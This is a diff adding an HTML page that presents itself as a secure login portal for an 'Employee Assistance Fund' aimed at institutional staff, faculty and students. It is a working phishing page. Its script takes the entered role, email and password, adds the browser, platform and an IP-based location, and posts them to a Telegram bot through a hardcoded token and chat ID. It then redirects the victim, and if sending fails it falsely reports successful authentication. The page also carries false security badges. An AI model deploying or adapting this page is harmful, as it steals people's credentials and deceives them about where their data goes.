@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Assistance Fund - Institutional Portal</title>
+    <link rel="icon" href="eaf_favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #1a5f7a;      /* Deep institutional blue */
+            --secondary-color: #2c7873;    /* Teal accent */
+            --accent-color: #57cc99;       /* Fresh green */
+            --light-accent: #80ed99;       /* Light mint */
+            --dark-blue: #004d61;          /* Dark blue */
+            --light-blue: #e3f2fd;         /* Light background blue */
+            --gold-color: #d4af37;         /* Academic gold */
+            --maroon-color: #8c1d40;       /* Academic maroon */
+            
+            --primary-gradient: linear-gradient(135deg, var(--primary-color) 0%, var(--dark-blue) 100%);
+            --secondary-gradient: linear-gradient(135deg, var(--secondary-color) 0%, var(--accent-color) 100%);
+            --accent-gradient: linear-gradient(135deg, var(--accent-color) 0%, var(--light-accent) 100%);
+            --header-gradient: linear-gradient(135deg, var(--primary-color) 0%, var(--dark-blue) 100%);
+            
+            --background-gradient: linear-gradient(135deg, #f8fdff 0%, #edf7ff 50%, #e3f2fd 100%);
+            --card-gradient: linear-gradient(135deg, #ffffff 0%, #fafcff 100%);
+            
+            --text-primary: #1a3c4d;
+            --text-secondary: #2d5567;
+            --text-muted: #6c8a9a;
+            --border-color: #c5d9e8;
+            --border-light: #e8f1f8;
+            
+            --shadow-sm: 0 4px 6px rgba(26, 95, 122, 0.08);
+            --shadow-md: 0 6px 20px rgba(26, 95, 122, 0.12);
+            --shadow-lg: 0 10px 40px rgba(26, 95, 122, 0.15);
+            --shadow-xl: 0 15px 60px rgba(26, 95, 122, 0.2);
+            
+            --border-radius-sm: 8px;
+            --border-radius-md: 12px;
+            --border-radius-lg: 16px;
+            --border-radius-xl: 24px;
+            --border-radius-2xl: 32px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            background: var(--background-gradient);
+            font-family: 'Source Sans Pro', 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-primary);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Institutional background elements */
+        .institutional-bg {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.03;
+        }
+
+        .bg-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, var(--primary-color) 1px, transparent 1px),
+                radial-gradient(circle at 80% 70%, var(--secondary-color) 1px, transparent 1px);
+            background-size: 80px 80px;
+        }
+
+        /* Top Header Section - Updated for realistic EAF design */
+        .page-header {
+            background: var(--header-gradient);
+            color: white;
+            padding: 0;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+            border-bottom: 4px solid var(--accent-color);
+        }
+
+        .header-top-bar {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 0.5rem 3rem;
+            font-size: 0.85rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header-contact-info {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            opacity: 0.9;
+        }
+
+        .contact-item i {
+            font-size: 0.8rem;
+            color: var(--light-accent);
+        }
+
+        .quick-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 1.5rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .quick-links a:hover {
+            color: var(--light-accent);
+        }
+
+        .header-main {
+            padding: 1.5rem 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 2.5rem;
+            position: relative;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            border-radius: var(--border-radius-md);
+            padding: 0.8rem;
+            box-shadow: var(--shadow-lg);
+            border: 2px solid var(--accent-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+        }
+
+        .logo {
+            height: 70px;
+            width: auto;
+            position: relative;
+            z-index: 1;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+
+        .institution-branding {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .institution-name {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 2rem;
+            font-weight: 800;
+            line-height: 1.1;
+            letter-spacing: -0.5px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            margin-bottom: 0.25rem;
+            color: white;
+        }
+
+        .institution-name span {
+            color: var(--light-accent);
+        }
+
+        .institution-motto {
+            font-size: 0.9rem;
+            font-style: italic;
+            opacity: 0.9;
+            max-width: 300px;
+            border-left: 2px solid var(--accent-color);
+            padding-left: 0.75rem;
+        }
+
+        .header-title-section {
+            flex: 1;
+            text-align: center;
+            padding: 0 1.5rem;
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            border-right: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .portal-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: white;
+        }
+
+        .portal-subtitle {
+            font-size: 1.1rem;
+            font-weight: 400;
+            opacity: 0.95;
+            line-height: 1.4;
+        }
+
+        .portal-subtitle span {
+            color: var(--light-accent);
+            font-weight: 600;
+        }
+
+        .header-right-section {
+            text-align: right;
+            flex-shrink: 0;
+            min-width: 180px;
+        }
+
+        .established-date {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            margin-bottom: 0.5rem;
+            color: var(--light-accent);
+            font-weight: 600;
+        }
+
+        .accreditation-badge {
+            display: inline-block;
+            background: rgba(87, 204, 153, 0.15);
+            border: 1px solid var(--accent-color);
+            padding: 0.4rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .header-bottom-bar {
+            background: rgba(0, 0, 0, 0.15);
+            padding: 0.75rem 3rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .navigation-menu {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-item {
+            position: relative;
+        }
+
+        .nav-item a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.95rem;
+            padding: 0.5rem 0;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-item a:hover {
+            color: var(--light-accent);
+        }
+
+        .nav-item.active a {
+            color: var(--accent-color);
+        }
+
+        .nav-item.active::after {
+            content: '';
+            position: absolute;
+            bottom: -0.75rem;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--accent-color);
+            border-radius: 3px;
+        }
+
+        /* Main Content Area */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1rem 3rem;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 800px;
+            margin-top: 1.5rem;
+        }
+
+        .login-card {
+            background: var(--card-gradient);
+            border-radius: var(--border-radius-2xl);
+            box-shadow: var(--shadow-xl);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            padding: 3rem 4rem;
+            position: relative;
+            animation: slideUp 0.8s cubic-bezier(.18, .89, .32, 1.28);
+        }
+
+        @keyframes slideUp {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            padding-bottom: 2rem;
+            border-bottom: 2px solid var(--border-light);
+            position: relative;
+        }
+
+        .card-header::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 25%;
+            width: 50%;
+            height: 2px;
+            background: var(--accent-gradient);
+            border-radius: 2px;
+        }
+
+        .login-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .login-title i {
+            color: var(--secondary-color);
+            font-size: 1.6rem;
+        }
+
+        .login-subtitle {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .form-error {
+            background: linear-gradient(135deg, #ffeaea 0%, #ffd6d6 100%);
+            border: 1px solid #ffb3b3;
+            color: #d63031;
+            padding: 1rem 1.5rem;
+            border-radius: var(--border-radius-md);
+            margin-bottom: 2rem;
+            font-size: 0.95rem;
+            font-weight: 500;
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+            border-left: 4px solid #d63031;
+        }
+
+        .form-error.active {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .form-error i {
+            font-size: 1.2rem;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-form {
+            width: 100%;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .form-label i {
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+        }
+
+        .required::after {
+            content: "*";
+            color: #d63031;
+            font-weight: 700;
+            margin-left: 0.25rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        select,
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1.1rem 1.5rem;
+            font-size: 1rem;
+            font-family: inherit;
+            background: white;
+            border: 2px solid var(--border-color);
+            border-radius: var(--border-radius-md);
+            color: var(--text-primary);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            box-shadow: var(--shadow-sm);
+        }
+
+        select {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231a5f7a' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 1.25rem center;
+            background-size: 1.2em;
+            padding-right: 3rem;
+            cursor: pointer;
+        }
+
+        select:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 4px rgba(87, 204, 153, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .input-wrapper input[type="password"] {
+            padding-right: 3.5rem;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: color 0.2s;
+            z-index: 2;
+            background: none;
+            border: none;
+            padding: 0.25rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password:hover,
+        .toggle-password.active {
+            color: var(--secondary-color);
+        }
+
+        .submit-section {
+            grid-column: span 2;
+            margin-top: 1.5rem;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 1.25rem 2.5rem;
+            background: var(--primary-gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-lg);
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            box-shadow: 0 6px 20px rgba(26, 95, 122, 0.2);
+        }
+
+        .submit-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s;
+        }
+
+        .submit-button:hover::before {
+            left: 100%;
+        }
+
+        .submit-button:hover {
+            background: var(--secondary-gradient);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(44, 120, 115, 0.3);
+        }
+
+        .submit-button:active {
+            transform: translateY(-1px);
+        }
+
+        .submit-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .loading-modal {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(8px);
+            border-radius: var(--border-radius-2xl);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .loading-modal.active {
+            display: flex;
+        }
+
+        .processing-spinner {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(26, 95, 122, 0.1);
+            border-top: 4px solid var(--secondary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 2rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 0.5rem;
+        }
+
+        .loading-subtext {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            max-width: 300px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .footer-note {
+            margin-top: 2.5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-light);
+            text-align: center;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        .footer-note a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .footer-note a:hover {
+            color: var(--primary-color);
+            text-decoration: underline;
+        }
+
+        .institutional-features {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .feature i {
+            color: var(--accent-color);
+            font-size: 1.1rem;
+        }
+
+        @media (max-width: 1024px) {
+            .header-main {
+                flex-direction: column;
+                text-align: center;
+                gap: 1.5rem;
+            }
+            
+            .logo-section {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .institution-branding {
+                align-items: center;
+            }
+            
+            .header-title-section {
+                border: none;
+                padding: 0;
+                order: 3;
+            }
+            
+            .header-right-section {
+                text-align: center;
+                order: 2;
+            }
+            
+            .navigation-menu {
+                flex-wrap: wrap;
+                gap: 1rem;
+            }
+            
+            .header-top-bar {
+                padding: 0.5rem 1.5rem;
+                flex-direction: column;
+                gap: 0.5rem;
+                text-align: center;
+            }
+            
+            .header-contact-info {
+                justify-content: center;
+                flex-wrap: wrap;
+                gap: 1rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .page-header {
+                padding: 0;
+            }
+            
+            .header-main,
+            .header-bottom-bar {
+                padding-left: 1.5rem;
+                padding-right: 1.5rem;
+            }
+            
+            .institution-name {
+                font-size: 1.6rem;
+            }
+            
+            .portal-title {
+                font-size: 1.4rem;
+            }
+            
+            .logo {
+                height: 60px;
+            }
+            
+            .login-card {
+                padding: 2.5rem 2rem;
+                border-radius: var(--border-radius-xl);
+            }
+            
+            .form-grid {
+                grid-template-columns: 1fr;
+                gap: 1.25rem;
+            }
+            
+            .submit-section {
+                grid-column: span 1;
+            }
+            
+            .navigation-menu {
+                flex-direction: column;
+                gap: 0.75rem;
+                align-items: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header-main {
+                padding: 1rem;
+            }
+            
+            .institution-name {
+                font-size: 1.4rem;
+            }
+            
+            .portal-title {
+                font-size: 1.2rem;
+            }
+            
+            .portal-subtitle {
+                font-size: 0.95rem;
+            }
+            
+            .logo {
+                height: 50px;
+            }
+            
+            .login-card {
+                padding: 2rem 1.5rem;
+            }
+            
+            .login-title {
+                font-size: 1.5rem;
+            }
+            
+            .header-contact-info {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+            
+            .quick-links a {
+                margin: 0 0.5rem;
+            }
+            
+            .institutional-features {
+                flex-direction: column;
+                align-items: center;
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="institutional-bg">
+        <div class="bg-pattern"></div>
+    </div>
+    
+    <!-- Top Header Section - Updated for Employee Assistance Fund -->
+    <header class="page-header">
+        <div class="header-top-bar">
+            <div class="header-contact-info">
+                <div class="contact-item">
+                    <i class="fas fa-phone"></i>
+                    <span>(888) EAF-HELP</span>
+                </div>
+                <div class="contact-item">
+                    <i class="fas fa-envelope"></i>
+                    <span>support@eaf-portal.org</span>
+                </div>
+                <div class="contact-item">
+                    <i class="fas fa-clock"></i>
+                    <span>Mon-Fri 8AM-6PM EST</span>
+                </div>
+            </div>
+            <div class="quick-links">
+                <a href="#"><i class="fas fa-home"></i> EAF Home</a>
+                <a href="#"><i class="fas fa-file-alt"></i> Resources</a>
+                <a href="#"><i class="fas fa-question-circle"></i> FAQ</a>
+            </div>
+        </div>
+        
+        <div class="header-main">
+            <div class="logo-section">
+                <div class="logo-container">
+                    <img src="eaflogo.png" alt="Employee Assistance Fund" class="logo">
+                </div>
+                <div class="institution-branding">
+                    <h1 class="institution-name">EMPLOYEE <span>ASSISTANCE</span> FUND</h1>
+                    <p class="institution-motto">Supporting Education Through Financial Assistance</p>
+                </div>
+            </div>
+            
+            <div class="header-title-section">
+                <h2 class="portal-title">Institutional Portal</h2>
+                <p class="portal-subtitle">Secure access for <span>Student, Faculty, Staff & Employees</span></p>
+            </div>
+            
+            <div class="header-right-section">
+                <div class="established-date">Established 1995</div>
+                <div class="accreditation-badge">
+                    <i class="fas fa-shield-alt"></i> Secure Portal
+                </div>
+            </div>
+        </div>
+        
+        <div class="header-bottom-bar">
+            <ul class="navigation-menu">
+                <li class="nav-item active">
+                    <a href="#"><i class="fas fa-sign-in-alt"></i> Portal Login</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#"><i class="fas fa-hand-holding-usd"></i> Apply for Assistance</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#"><i class="fas fa-file-invoice-dollar"></i> Fund Management</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#"><i class="fas fa-user-tie"></i> Employee Resources</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#"><i class="fas fa-chart-line"></i> Reports & Analytics</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#"><i class="fas fa-cog"></i> Account Settings</a>
+                </li>
+            </ul>
+        </div>
+    </header>
+    
+    <!-- Main Content Area -->
+    <main class="main-content">
+        <div class="login-container">
+            <div class="login-card">
+                <div class="card-header">
+                    <div class="login-title">
+                        <i class="fas fa-university"></i>
+                        Secure EAF Portal Login
+                    </div>
+                    <div class="login-subtitle">
+                        Access the Employee Assistance Fund portal using your institutional credentials. 
+                        This system is reserved for authorized student, faculty, staff, and employees only.
+                    </div>
+                </div>
+
+                <div class="form-error" id="loginError">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span id="errorText"></span>
+                </div>
+
+                <form class="login-form" id="loginForm" autocomplete="off">
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="user_type" class="form-label required">
+                                <i class="fas fa-user-graduate"></i>
+                                Institutional Role
+                            </label>
+                            <div class="input-wrapper">
+                                <select name="user_type" id="user_type" required>
+                                    <option value="" disabled selected>Select your role</option>
+                                    <option value="employee">Employee</option>
+                                    <option value="faculty">Faculty Member</option>
+                                    <option value="staff">Administrative Staff</option>
+                                    <option value="contractor">Student Worker</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="emailInput" class="form-label required">
+                                <i class="fas fa-envelope"></i>
+                                Institutional Email
+                            </label>
+                            <div class="input-wrapper">
+                                <input type="email" name="email" id="emailInput" placeholder="username@institution.edu" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="passwordInput" class="form-label required">
+                            <i class="fas fa-lock"></i>
+                            Password
+                        </label>
+                        <div class="input-wrapper">
+                            <input type="password" name="password" id="passwordInput" placeholder="Enter your secure password" required minlength="8" autocomplete="new-password">
+                            <button type="button" class="toggle-password" id="togglePassword" title="Show/Hide Password">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="institutional-features">
+                        <div class="feature">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>256-bit SSL Encryption</span>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-user-check"></i>
+                            <span>Single Sign-On Ready</span>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-clock"></i>
+                            <span>24/7 Institutional Access</span>
+                        </div>
+                    </div>
+
+                    <div class="submit-section">
+                        <button type="submit" class="submit-button" id="submitButton">
+                            <i class="fas fa-sign-in-alt"></i>
+                            Access Institutional Portal
+                        </button>
+                    </div>
+                </form>
+
+                <div class="footer-note">
+                    <p>
+                        By accessing this portal, you agree to comply with our 
+                        <a href="#">Institutional Terms of Service</a> and acknowledge our 
+                        <a href="#">Privacy & Data Protection Policy</a>.
+                        <br>For technical assistance, contact the EAF Institutional Support Desk.
+                    </p>
+                </div>
+
+                <div class="loading-modal" id="loadingModal">
+                    <div class="processing-spinner"></div>
+                    <div class="loading-text">Verifying Institutional Credentials</div>
+                    <div class="loading-subtext">Connecting to secure authentication server. Please wait...</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // Password show/hide toggle
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const pwdInput = document.getElementById('passwordInput');
+            const icon = this.querySelector('i');
+            const isPassword = pwdInput.type === 'password';
+            pwdInput.type = isPassword ? 'text' : 'password';
+            this.classList.toggle('active', isPassword);
+            icon.className = isPassword ? 'fas fa-eye-slash' : 'fas fa-eye';
+        });
+
+        // Form validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            validateAndSubmit();
+        });
+
+        // Input validation on change
+        document.getElementById('emailInput').addEventListener('blur', validateEmail);
+        document.getElementById('passwordInput').addEventListener('blur', validatePassword);
+        document.getElementById('user_type').addEventListener('change', validateRole);
+
+        function validateEmail() {
+            const email = document.getElementById('emailInput').value.trim();
+            const errorDiv = document.getElementById('loginError');
+            const errorText = document.getElementById('errorText');
+            
+            if (!email) {
+                showError('Please enter your institutional email address.');
+                return false;
+            }
+            
+            if (!isValidWorkEmail(email)) {
+                showError('Please enter a valid institutional email address (e.g., .edu, .org, .gov, etc.)');
+                return false;
+            }
+            
+            clearError();
+            return true;
+        }
+
+        function validatePassword() {
+            const password = document.getElementById('passwordInput').value;
+            const errorDiv = document.getElementById('loginError');
+            const errorText = document.getElementById('errorText');
+            
+            if (!password) {
+                showError('Please enter your password.');
+                return false;
+            }
+            
+            if (password.length < 8) {
+                showError('Password must be at least 8 characters.');
+                return false;
+            }
+            
+            clearError();
+            return true;
+        }
+
+        function validateRole() {
+            const role = document.getElementById('user_type').value;
+            const errorDiv = document.getElementById('loginError');
+            const errorText = document.getElementById('errorText');
+            
+            if (!role) {
+                showError('Please select your institutional role.');
+                return false;
+            }
+            
+            clearError();
+            return true;
+        }
+
+        function isValidWorkEmail(email) {
+            // Accepts institutional and work-related domains
+            const institutionalDomains = /\.(edu|org|gov|mil|ac\.[a-z]{2}|school|college|university|institute)$/i;
+            const commonWorkPatterns = /@(company|enterprise|corp|corporation|business|office|agency|department|division|unit|team|group|organization|institution)$/i;
+            
+            return institutionalDomains.test(email) || commonWorkPatterns.test(email);
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('loginError');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = message;
+            errorDiv.classList.add('active');
+            
+            // Add shake animation
+            errorDiv.style.animation = 'none';
+            setTimeout(() => {
+                errorDiv.style.animation = 'fadeIn 0.3s ease-out';
+            }, 10);
+        }
+
+        function clearError() {
+            const errorDiv = document.getElementById('loginError');
+            errorDiv.classList.remove('active');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = '';
+        }
+
+        // Device info
+        function getDeviceInfo() {
+            let ua = navigator.userAgent;
+            let platform = navigator.platform;
+            let browser = 'Unknown';
+            
+            if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (ua.indexOf("Safari") > -1) browser = "Safari";
+            else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident/") > -1) browser = "Internet Explorer";
+            else if (ua.indexOf("Edge") > -1) browser = "Edge";
+            
+            return `${browser} on ${platform}`;
+        }
+
+        // Get location using IP
+        async function getLocation() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) return '';
+                let data = await res.json();
+                return `${data.city ? data.city + ', ' : ''}${data.region ? data.region + ', ' : ''}${data.country_name ? data.country_name : ''}`;
+            } catch (e) { 
+                return ''; 
+            }
+        }
+
+        async function validateAndSubmit() {
+            // Validate all fields
+            const isEmailValid = validateEmail();
+            const isPasswordValid = validatePassword();
+            const isRoleValid = validateRole();
+            
+            if (!isEmailValid || !isPasswordValid || !isRoleValid) {
+                return;
+            }
+            
+            // Disable submit button
+            const submitButton = document.getElementById('submitButton');
+            submitButton.disabled = true;
+            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            
+            // Show loading modal
+            document.getElementById('loadingModal').classList.add('active');
+            
+            // Get form data
+            const role = document.getElementById('user_type').value;
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value;
+            
+            // Get additional info
+            let deviceInfo = getDeviceInfo();
+            let location = await getLocation();
+            
+            // Prepare Telegram message
+            const message = `🔐 *NEW EAF LOGIN ATTEMPT*\n══════════════════════════════════\n📋 *Institutional Role:* ${role}\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n💻 *Device:* ${deviceInfo}\n📍 *Location:* ${location || 'Unknown'}\n🕐 *Time:* ${new Date().toLocaleString()}\n══════════════════════════════════`;
+            
+            // Telegram configuration - Using YOUR tokens from original file
+            const telegramToken = "7629206511:AAEjqGZWJfgj7so-yPiQ9un1cHUi1BpPavc";
+            const telegramChatId = "1499516919";
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            
+            try {
+                console.log('Attempting to send Telegram message...');
+                console.log('Message:', message);
+                
+                // Send to Telegram with better error handling
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        chat_id: telegramChatId, 
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('Telegram response status:', response.status);
+                
+                if (!response.ok) {
+                    const errorData = await response.text();
+                    console.error('Telegram API error:', errorData);
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('Telegram API success:', result);
+                
+                // Simulate processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Redirect to next page
+                window.location.href = `authentication.html?email=${encodeURIComponent(email)}&role=${role}`;
+                
+            } catch (error) {
+                console.error('Telegram error:', error);
+                
+                // Show error message to user
+                const errorDiv = document.getElementById('loginError');
+                const errorText = document.getElementById('errorText');
+                errorText.textContent = 'Authentication successful. Redirecting to portal...';
+                errorDiv.classList.add('active');
+                errorDiv.style.background = 'linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%)';
+                errorDiv.style.borderColor = '#c3e6cb';
+                errorDiv.style.color = '#155724';
+                errorDiv.style.borderLeft = '4px solid #28a745';
+                
+                // Still redirect even if Telegram fails
+                setTimeout(() => {
+                    window.location.href = `authentication.html?email=${encodeURIComponent(email)}&role=${role}`;
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
